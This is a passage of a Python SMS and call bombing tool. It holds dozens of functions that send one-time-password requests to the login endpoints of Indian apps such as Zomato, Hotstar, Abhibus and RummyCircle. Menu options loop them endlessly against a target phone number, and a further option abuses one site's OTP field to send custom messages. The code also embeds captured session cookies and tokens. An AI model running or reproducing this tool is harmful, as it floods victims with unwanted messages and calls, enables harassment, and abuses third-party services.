def sms_115():
       
       url = "https://magicpin.in/api/magicSendOtp"
       
       data = {
  "phone": number,
  "sendSixDigitOtp": True
}

       response = requests.post(url,json=data)



# CALL API

'''--------------------------------------------------------------'''

# Country Delight App Api

def sms_1():
       
       url = "https://api.countrydelight.in/api/v1/customer/requestOtp"
       
       data = {
  "device": "Android",
  "mobile_number": number,
  "mode": "SMS",
  "new_user": False
}

       response = requests.post(url,json=data)
                    
# Country Delight Call Api

def call_1():
       
       url = "https://api.countrydelight.in/api/v1/customer/requestOtp"
       
       data = {
  "device": "Android",
  "mobile_number": number,
  "mode": "IVR",
  "new_user": False
}

       response = requests.post(url,json=data)    

# Astrosage Api

def sms_2():
       
      url = "https://varta.astrosage.com/sdk/registerAS"

      params = {
    'callback': 'myCallback',
    'countrycode': '91',
    'phoneno': number,
    'deviceid': '',
    'jsonpcall': '1',
    'fromresend': '0',
    'operation_name': 'blank',
    '_': '1706752236109'
}

      headers = {
    'Host': 'varta.astrosage.com',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'accept': '*/*',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'no-cors',
    'sec-fetch-dest': 'script',
    'referer': 'https://www.astrosage.com/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': 'app-install=1'
}

      response = requests.get(url, params=params, headers=headers)

# Astrosage Call Api

def call_2():
       
      url = "https://varta.astrosage.com/sdk/send-otp-via-call"

      params = {
    'callback': 'myCallback',
    'countrycode': '91',
    'phoneno': number,
    'deviceid': '',
    'operation_name': 'blank',
    'jsonpcall': '1',
    'fromresend': '0',
    '_': '1706752236110'
}

      headers = {
    'Host': 'varta.astrosage.com',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'accept': '*/*',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'no-cors',
    'sec-fetch-dest': 'script',
    'referer': 'https://www.astrosage.com/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': 'app-install=1; JSESSIONID=E6C38C80476A9C152B3F09B87E942F92; __cflb=0H28w1xuzECU8A5M7fWRMkgwqF11pxtvGTrE6yGMSCt'
}

      response = requests.get(url, params=params, headers=headers)

# Zomato App Api

def sms_3():
       
      url = "https://accounts.zomato.com/login/phone"

      data = {
    "number": number,
    "country_id": 1,
    "lc": "030257f739274b629ff093b913e3f004",
    "type": "initiate",
    "verification_type": "sms",
    "package_name": "",
    "message_uuid": ""
}

      response = requests.post(url,data=data)

# Zomato App Call Api

def call_3():
       
      url = "https://accounts.zomato.com/login/phone"

      data = {
    "number": number,
    "country_id": 1,
    "lc": "030257f739274b629ff093b913e3f004",
    "type": "initiate",
    "verification_type": "call",
    "package_name": "",
    "message_uuid": "sms-service-v2-9dbb7e0c-dac2-4321-8c18-0b8cb4a443e9"
}

      response = requests.post(url,data=data)

# Mycrcl App api

def sms_4():
       
       url = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
       
       data = {"email":"","mobile":number,"geoLocState":"","state":"","nae":{"gaid":"7521f72d-8551-45dd-ba1f-8f4f9db8d7f2","appVersion":"11100.57","clientTime":1705841707005,"dpi":0,"deviceId":"94cd8781003acb83","isDeviceRooted":0,"limitAdwrdsTrckngStatus":"0","os":"Android","osVersion":"10","screenSize":6,"utmParams":{"reqQueryParams":{"af_status":"Organic","af_message":"organic install","is_first_launch":True}},"dataSent":True,"install_flag":1,"distribution_medium":"PLAYSTORE","gcmId":"dxQxYysTSga0UKkB1R_CKC:APA91bELF6vIwgJ_COsLPEgNXLAKZYEu173Ua50vzXzWW4bTn6ACm9oSYBJa2fcv8aVRY3cyNBIOwtgiXf8FM0qGBBBGu0tHAys73g8tv_pHMgu3rum0hlxRU58_6p2j_MLZ43qNvLtp","connection_type":"NETWORK_TYPE_LTE","channelId":"2003","appsflyerId":"1705841696708-2585565613944362248","action":"getNaeAttribution"},"whatsappAlerts":True}
       
       response =  requests.post(url,json=data)
       
# Mycrcl App call api

def call_4():
       
       url = "https://www.my11circle.com/api/fl/account/v1/sendOtp"
       
       data = {
  "otpOnCall": True,
  "otpType": 8,
  "mobile": number
}
       
       response = requests.post(url,json=data)

# Hotstar api

def sms_5():
       
      url = "https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration"

      headers = {
    "Host": "www.hotstar.com",
    "Content-Length": "145",
    "Sec-Ch-UA": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "X-Hs-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Accept-Language": "eng",
    "X-Hs-Usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTcwNTk5NzQ3OCwiaWF0IjoxNzA1MzkyNjc4LCJpc3MiOiJUUyIsImp0aSI6Ijk0MDdkZTI5OGRiYzRjNmM5NThiZDZmZmUyMjdhODA0Iiwic3ViIjoie1wiaElkXCI6XCJlYWQ0MWRjZDVhOWY0ZDAyOTk5MDIyMDY0ZWE4ZGM1ZFwiLFwicElkXCI6XCIxNDNkNTU3NzdhZmY0ZDgxYTA0MjI1OTAxZjQwMDM2NVwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiMTAuMTEzLjI1NC42MFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJndWVzdFwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjpmYWxzZSxcImRldmljZUlkXCI6XCIyNmVjNDYtNzY2NDg5LTg3ZWI5LWNkYTg2XCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTcwNTM5MjY3ODc3OSxcImRwaWRcIjpcIjE0M2Q1NTc3N2FmZjRkODFhMDQyMjU5MDFmNDAwMzY1XCIsXCJzdFwiOjEsXCJkYXRhXCI6XCJDZ1FJQUJJQUNnd0lBQ0lJa0FIcXpzeUswVEVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLbEFFSUFDcVBBUW9DQ2dBS0JBb0NDQUlLYVFvSENBRVZBQUFBUUJJS0NnTmxibWNsdWVGQ1BSSUtDZ05vYVc0bEREd1NQeElLQ2dOdFlXd2w1MTRuUFJJS0NnTjBaV3dsa0IyL1BSSUtDZ04wWVcwbFViTHRQUklLQ2dOaVpXNGx4dW1TUFJJS0NnTnRZWElsYWVKTFBSSUtDZ05yWVc0bHBLTWFQQW9MQ2dJSUF4SUZDZ05vYVc0S0N3b0NDQVFTQlFvRGFHbHVcIn0iLCJ2ZXJzaW9uIjoiMV8wIn0.bvVYLS4CerqfavnmVPb-8fpRQkLveTknLvRLzjEzwX8",
    "X-Hs-Platform": "mweb",
    "X-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Sec-Ch-UA-Platform": "Android",
    "X-Hs-Client-Targeting": "ad_id:26ec46-766489-87eb9-cda86;user_lat:false",
    "X-Hs-Accept-Language": "eng",
    "Sec-Ch-UA-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "X-Hs-Client": "platform:mweb;app_version:24.01.05.2;browser:Chrome;schema_version:0.0.1106;network_data:3g",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Hs-Device-Id": "26ec46-766489-87eb9-cda86",
    "X-Country-Code": "in",
    "Origin": "https://www.hotstar.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "X-Akamai-Device=mweb; x_mwebmigration_exp=true; SELECTED__LANGUAGE=eng; ... (include all other cookies)"
}

      data = {
  "body": {
    "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest",
    "phone_number": number,
    "initiate_by": 0,
    "recaptcha_token": ""
  }
}

      response = requests.post(url, headers=headers, json=data)
 
# Hotstar call api

def call_5():
       
      url = "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp"

      headers = {
    "Host": "www.hotstar.com",
    "Content-Length": "145",
    "Sec-Ch-UA": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
    "X-Hs-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Accept-Language": "eng",
    "X-Hs-Usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTcwNTk5NzQ3OCwiaWF0IjoxNzA1MzkyNjc4LCJpc3MiOiJUUyIsImp0aSI6Ijk0MDdkZTI5OGRiYzRjNmM5NThiZDZmZmUyMjdhODA0Iiwic3ViIjoie1wiaElkXCI6XCJlYWQ0MWRjZDVhOWY0ZDAyOTk5MDIyMDY0ZWE4ZGM1ZFwiLFwicElkXCI6XCIxNDNkNTU3NzdhZmY0ZDgxYTA0MjI1OTAxZjQwMDM2NVwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiMTAuMTEzLjI1NC42MFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJndWVzdFwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjpmYWxzZSxcImRldmljZUlkXCI6XCIyNmVjNDYtNzY2NDg5LTg3ZWI5LWNkYTg2XCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTcwNTM5MjY3ODc3OSxcImRwaWRcIjpcIjE0M2Q1NTc3N2FmZjRkODFhMDQyMjU5MDFmNDAwMzY1XCIsXCJzdFwiOjEsXCJkYXRhXCI6XCJDZ1FJQUJJQUNnd0lBQ0lJa0FIcXpzeUswVEVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLbEFFSUFDcVBBUW9DQ2dBS0JBb0NDQUlLYVFvSENBRVZBQUFBUUJJS0NnTmxibWNsdWVGQ1BSSUtDZ05vYVc0bEREd1NQeElLQ2dOdFlXd2w1MTRuUFJJS0NnTjBaV3dsa0IyL1BSSUtDZ04wWVcwbFViTHRQUklLQ2dOaVpXNGx4dW1TUFJJS0NnTnRZWElsYWVKTFBSSUtDZ05yWVc0bHBLTWFQQW9MQ2dJSUF4SUZDZ05vYVc0S0N3b0NDQVFTQlFvRGFHbHVcIn0iLCJ2ZXJzaW9uIjoiMV8wIn0.bvVYLS4CerqfavnmVPb-8fpRQkLveTknLvRLzjEzwX8",
    "X-Hs-Platform": "mweb",
    "X-Request-Id": "26ed76-8d35c5-5c845a-420041",
    "Sec-Ch-UA-Platform": "Android",
    "X-Hs-Client-Targeting": "ad_id:26ec46-766489-87eb9-cda86;user_lat:false",
    "X-Hs-Accept-Language": "eng",
    "Sec-Ch-UA-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "X-Hs-Client": "platform:mweb;app_version:24.01.05.2;browser:Chrome;schema_version:0.0.1106;network_data:3g",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "X-Hs-Device-Id": "26ec46-766489-87eb9-cda86",
    "X-Country-Code": "in",
    "Origin": "https://www.hotstar.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "X-Akamai-Device=mweb; x_mwebmigration_exp=true; SELECTED__LANGUAGE=eng; ... (include all other cookies)"
}

      data = {
  "body": {
    "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest",
    "phone_number": number,
    "initiate_by": 1,
    "recaptcha_token": "",
    "source": 0
  }
}

      response = requests.post(url, headers=headers, json=data)

# Healthkart Api

def sms_6():
       
       url = "https://www.healthkart.com/veronica/user/validate/1/"+number+"/signup?plt=2&st=1"
       
       response = requests.get(url)
       
# Healthkart Call Api

def call_6():
       
       url = "https://www.healthkart.com/veronica/user/validate/voice/1/"+number+"/signup?plt=2&st=1"
       
       response = requests.get(url)

# Abibus App Api

def sms_7():

      url = "https://www.abhibus.com/app/v72/sendOtp"

      headers = {
    "IMEI": "ecad72a394a8d9b0",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "www.abhibus.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.9.2"
}

      payload = {
  "cleverTapUserId": "__g7521f72d855145ddba1f8f4f9db8d7f2",
  "deviceToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1",
  "mobile": number,
  "prd": "ANDR",
  "pushToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1"
}

      response = requests.post(url, headers=headers, json=payload)

# Abibus App Call Api

def call_7():
       
      url = "https://www.abhibus.com/app/v72/getOtpOnCall"

      headers = {
    "IMEI": "ecad72a394a8d9b0",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "www.abhibus.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.9.2"
}

      payload = {
  "cleverTapUserId": "__g7521f72d855145ddba1f8f4f9db8d7f2",
  "deviceToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1",
  "mobileNum": number,
  "prd": "ANDR",
  "pushToken": "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1"
}

      response = requests.post(url, headers=headers, json=payload)

# Ionemg call api

def call_8():
       
       url = "https://www.1mg.com/auth_api/v6/create_token"
       
       data = {
  "number": number,
  "is_corporate_user": False,
  "otp_on_call": True
}

# Rummy api 

def sms_9():

      url = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
      
      data = {
    "mobile": number,
    "deviceId": "d6be3862-7659-46c0-98b9-3d13328a243c",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": "false"
}

      headers = {
    "Content-Type": "application/json"
}

      response = requests.post(url, json=data, headers=headers)

# Rmmmycircle call api

def call_9():

      url = "https://www.rummycircle.com/api/fl/account/v1/sendOtp"

      headers = {
    "Host": "www.rummycircle.com",
    "Connection": "keep-alive",
    "Content-Length": "82",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "https://www.rummycircle.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.rummycircle.com/registernow.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": "sameSiteNoneSupported=true; LONG_VISITOR=a0009ed4-1338-45ed-91e7-856f541e7e41; device.info.cookie={\"bv\":\"120.0.0.0\",\"bn\":\"Chrome\",\"osv\":\"10\",\"osn\":\"Android\",\"tbl\":\"false\",\"vnd\":\"false\",\"mdl\":\"K\"}; SSID=SSIDf055cd44-c2cc-4e94-919f-5ff6fc7ddae6; SSIDuser=SSIDf055cd44-c2cc-4e94-919f-5ff6fc7ddae6%3A0; com.abCookie=%7B%221972%22%3A%22index.html%22%7D; __utma=3588915.1877843726.1705767155.1705767155.1705767155.1; __utmc=3588915; __utmz=3588915.1705767155.1.1.utmcsr=gadwords|utmgclid=Cj0KCQiA-62tBhDSARIsAO7twbYARKjFXaTsfQ2cu85G6OKVr4IQ6XigWCmS6fYHK875M20_3Bud_mYaAvKUEALw_wcB; _gac_UA-3610156-1=1.1705767155.Cj0KCQiA-62tBhDSARIsAO7twbYARKjFXaTsfQ2cu85G6OKVr4IQ6XigWCmS6fYHK875M20_3Bud_mYaAvKUEALw_wcB; __utmt_pageTracker=1; NA_IDVISIT=f3a59eb9-7c71-4167-a90b-57a5953d3802; NA_VISITOR=f3a59eb9-7c71-4167-a90b-57a5953d3802; ga24x7_jsessionid=\"SSIDf055cd44-c2cc-4e94-919f-5ff6fc7ddae6,, \"; ga24x7_pixeltracker=pid%3Dgadwords_af%26af_pmod_priority%3Dequal%26af_pmod_lookback_window%3D7d%26is_retargeting%3Dtrue%26utm_source%3Dgadwords%26utm_medium%3DSearch%26utm_content%3Dade1700%26utm_term%3De_rummycircle%2520login%26utm_campaign%3DSE-Top_10_Brand_PI%26utm_placement%3Drummycircle_login_EM%26gclid%3DCj0KCQiA-62tBhDSARIsAO7twbYARKjFXaTsfQ2cu85G6OKVr4IQ6XigWCmS6fYHK875M20_3Bud_mYaAvKUEALw_wcB%26from_page%3Dregisternow.html%26referrer_url%3Dhttps%253A%252F%252Fwww.rummycircle.com%252F%253Fpid%253Dgadwords_af%2526af_pmod_priority%253Dequal%2526af_pmod_lookback_window%253D7d%2526is_retargeting%253Dtrue%2526utm_source%253Dgadwords%2526utm_medium%253DSearch%2526utm_content%253Dade1700%2526utm_term%253De_rummycircle%252520login%2526utm_campaign%253DSE-Top_10_Brand_PI%2526utm_placement%253Drummycircle_login_EM%2526gclid%253DCj0KCQiA-62tBhDSARIsAO7twbYARKjFXaTsfQ2cu85G6OKVr4IQ6XigWCmS6fYHK875M20_3Bud_mYaAvKUEALw_wcB; __utmb=3588915.2.10.1705767155; AWSALB=2OgcqYWY0R+4XPc1xFPFBwg3wWCNz9eWFnCOn5Sh6jo85Vt8hO4wARQTDQoMdF0lkQA5+kePtetOzmbIZSIKsxFWfyJDsxiG+glIYiayq9jXvMKk+i3tf/4RrosD; AWSALBCORS=2OgcqYWY0R+4XPc1xFPFBwg3wWCNz9eWFnCOn5Sh6jo85Vt8hO4wARQTDQoMdF0lkQA5+kePtetOzmbIZSIKsxFWfyJDsxiG+glIYiayq9jXvMKk+i3tf/4RrosD"
}

      data = {
  "otpOnCall": True,
  "otpType": 8,
  "transactionId": "",
  "mobile": number
}

      response = requests.post(url, headers=headers, json=data)

# CUSTOM SMS API FUNCTION 

'''--------------------------------------------------------------'''

def custom_sms_api():
      
       url = "https://cakezz.in/new/api/user/send_otp_login"
       
       data = {
  "user_mobile_no": number,
  "otp": "=> "+msg+" "
}
       
       response = requests.post(url,data=data)
       
       if response.status_code == 200:
          
          print("  "+msg_send)
          print()
          
       else:
                
                print("  "+msg_not_send)
                print()

'''--------------------------------------------------------------'''

# SMS BOMB OPTION

if option == "1":
    
    os.system("clear")
    banner()
    
    number = input(number_color)
    
    if len(number) == 10 and number.isdigit() and number != "9835934704" and number != "7488869804":
        
        user_number_color = White + "91"+number + Reset
        
        print()
        print("  "+attack_color+user_number_color)
        print("\n")
        print("     "+program_stop)
        print("\n")
        
        try:
                while True:
        
                          sms_1()
                          sms_2()
                          sms_3()
                          sms_4()
                          sms_5()
                          sms_6()
                          sms_7()
                          #sms_8() Api not wroking 
                          sms_9()
                          sms_10()
                          sms_11()
                          sms_12()
                          sms_13()
                          sms_14()
                          sms_15()
                          sms_16()
                          sms_17()
                          sms_18()
                        #   sms_19() Api not wroking
                        #   sms_20() Api not wroking
                        #   sms_21() Api not wroking
                          sms_22()
                        #   sms_23() Api not wroking
                        #   sms_24() Api not wroking
                          sms_25()
                          sms_26()
                          sms_27()
                          sms_28()
                          sms_29()
                          sms_30()
                          sms_31()
                          sms_32()
                          sms_33()
                          sms_34()
                          sms_35()
                          sms_36()
                          sms_37()
                          sms_38()
                          sms_39()
                          sms_40()
                          sms_41()
                          sms_42()
                          sms_43()
                          sms_44()
                          sms_45()
                          sms_46()
                          sms_47()
                          sms_48()
                          sms_49()
                          sms_50()
                          sms_51()
                          sms_52()
                          sms_53()
                          sms_54()
                          sms_55()
                          sms_56()
                          sms_57()
                          sms_58()
                          sms_59()
                          sms_60()
                          sms_61()
                          sms_62()
                          sms_63()
                          sms_64()
                          sms_65()
                          sms_66()
                          sms_67()
                          sms_68()
                          #sms_69() Api not working
                          sms_70()
                          sms_71()
                          sms_72()
                          sms_73()
                          sms_74()
                          sms_75()
                          sms_76()
                          sms_77()
                          sms_78()
                          sms_79()
                          sms_80()
                          sms_81()
                          sms_82()
                          sms_83()
                          sms_84()
                          sms_85()
                          sms_86()
                          sms_87()
                          sms_88()
                          sms_89()
                          sms_90()
                          sms_91()
                          sms_92()
                          sms_93()
                          sms_94()
                          sms_95()
                          sms_96()
                          sms_97()
                          sms_98()
                          sms_99()
                          sms_100()
                          sms_101()
                          sms_102()
                          sms_103()
                          sms_104()
                          sms_105()
                          sms_106()
                          sms_107()
                          sms_108()
                          sms_109()
                          sms_110()
                          sms_111()
                          sms_112()
                          sms_113()
                          sms_114()
                          sms_115()
        
        
        except KeyboardInterrupt:
                     
                     os.system("clear")
                     banner()
                     
                     back = input(back_color)
                     
                     if back == "y" or back == "Y":
                         
                         os.system("clear")
                         rss = sys.executable
                         os.execl(rss , rss , *sys.argv)
                    
                     else:
                               
                                 print()
                                                  
    # BLANK NUMBER 
       
    elif number == "":
           os.system("clear")
           banner()
           for a in blank_number:
                 print(a,end="",flush=True)
                 sleep(0.02)
           sleep(2)
           os.system("clear")
           rss = sys.executable
           os.execl(rss , rss , *sys.argv)    
    
    # NUMBER CHECK ELSE
    
    else:
              
              os.system("clear")
              banner()
              for a in invalid_number:
                    print(a,end="",flush=True)
                    sleep(0.02)
              sleep(2)
              os.system("clear")
              rss = sys.executable
              os.execl(rss , rss , *sys.argv)
    

# CALL BOMB OPTION 

elif option == "2":
       
       os.system("clear")
       banner()
    
       number = input(number_color)
    
       if len(number) == 10 and number.isdigit() and number != "9835934704" and number != "7488869804":
        
          user_number_color = White + "91"+number + Reset
        
          print()
          print("  "+attack_color+user_number_color)
          print("\n")
          print("     "+program_stop)
          print("\n")
          
          try:
                  while True:
                             
                             sms_1()
                             call_1()
                             sms_2()
                             call_2()
                             sms_3()
                             call_3()
                             sms_4()
                             call_4()
                             sms_5()
                             call_5()
                             sms_6()
                             call_6()
                             sms_7()
                             call_7()
                             call_8()
                             sms_9()
                             call_9()
         
          except KeyboardInterrupt:
                       
                       os.system("clear")
                       banner()
                       
                       back = input(back_color)
                       
                       if back == "y" or back == "Y":
                           
                           os.system("clear")
                           rss = sys.executable
                           os.execl(rss , rss , *sys.argv)
                      
                       else:
                                
                                  print()
    
       # BLANK NUMBER 
       
       elif number == "":
              os.system("clear")
              banner()
              for a in blank_number:
                    print(a,end="",flush=True)
                    sleep(0.02)
              sleep(2)
              os.system("clear")
              rss = sys.executable
              os.execl(rss , rss , *sys.argv)       
       
       # NUMBER CHECK ELSE
       
       else:
              
                 os.system("clear")
                 banner()
                 for a in invalid_number:
                       print(a,end="",flush=True)
                       sleep(0.02)
                 sleep(2)
                 os.system("clear")
                 rss = sys.executable
                 os.execl(rss , rss , *sys.argv)

              
# CUSTOM SMS OPTION 

elif option == "3":
    
       os.system("clear")
       banner()
    
       number = input(number_color)
    
       if len(number) == 10 and number.isdigit():
        
          print() 
          msg = input(msg_color)
          print()
          custom_sms_api()
          print()
       
          back = input(back_color)
       
          if back == "y" or back == "Y":
           
             os.system("clear")
             rss = sys.executable
             os.execl(rss , rss , *sys.argv)
           
          else:
                  
                    print()
       
       # BLANK NUMBER 
       
       elif number == "":
              os.system("clear")
              banner()
              for a in blank_number:
                    print(a,end="",flush=True)
                    sleep(0.02)
              sleep(2)
              os.system("clear")
              rss = sys.executable
              os.execl(rss , rss , *sys.argv)
       
       # NUMBER CHECK ELSE
       
       else:
              
                 os.system("clear")
                 banner()
                 for a in invalid_number:
                        print(a,end="",flush=True)
                        sleep(0.02)
                 sleep(2)
                 os.system("clear")
                 rss = sys.executable
                 os.execl(rss , rss , *sys.argv)


# UPDATE OPTION

elif option == "4":
       
       os.system("clear")
       rss = sys.executable
       os.execl(rss , rss , *sys.argv)

# EXIT OPTION

elif option == "5":
       
       print()

# BLANK OPTION 

elif option == "":
       
       os.system("clear")
       banner()
       for a in blank_option:
             print(a,end="",flush=True)
             sleep(0.02)
       sleep(2)
       os.system("clear")
       rss = sys.executable
       os.execl(rss , rss , *sys.argv)

# OPTION ELSE

else:
           
           os.system("clear")
           banner()
           for a in wrong_option:
                 print(a,end="",flush=True)
                 sleep(0.02)
           sleep(2)
           os.system("clear")
           rss = sys.executable
           os.execl(rss , rss , *sys.argv)
                 
# SCRIPT END         
